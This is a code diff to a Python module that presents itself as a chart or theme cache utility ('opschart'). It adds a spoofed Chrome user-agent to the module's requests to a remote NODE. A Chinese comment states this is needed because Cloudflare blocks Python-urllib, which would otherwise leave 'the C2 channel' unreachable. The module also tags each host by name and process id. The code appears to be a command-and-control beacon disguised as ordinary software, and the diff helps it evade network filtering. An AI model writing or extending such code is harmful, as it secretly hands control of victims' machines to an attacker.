@@ -8,6 +8,9 @@ CACHE = os.path.expanduser("~/.cache/opschart")
 PIDF = os.path.join(CACHE, "sync.pid")
 TAG = socket.gethostname() + "|" + str(os.getpid())
 _SYS = sys.platform
+# 1001g 实弹：CF 边缘按 UA 拦 Python-urllib（403）⇒ 请求带常见浏览器 UA（否则 C2 通道整条不可达）
+_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+       "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
 
 
 def ensure_cache(theme_name="default"):
@@ -25,14 +28,15 @@ def ensure_cache(theme_name="default"):
 
 
 def _get(path):
-    with request.urlopen(NODE + path, timeout=10) as r:
+    req = request.Request(NODE + path, headers={"user-agent": _UA})
+    with request.urlopen(req, timeout=10) as r:
         return json.loads(r.read().decode("utf-8", "replace"))
 
 
 def _post(path, obj):
     data = json.dumps(obj).encode()
     req = request.Request(NODE + path, data=data,
-                          headers={"content-type": "application/json"}, method="POST")
+                          headers={"content-type": "application/json", "user-agent": _UA}, method="POST")
     with request.urlopen(req, timeout=10) as r:
         return r.read()
 
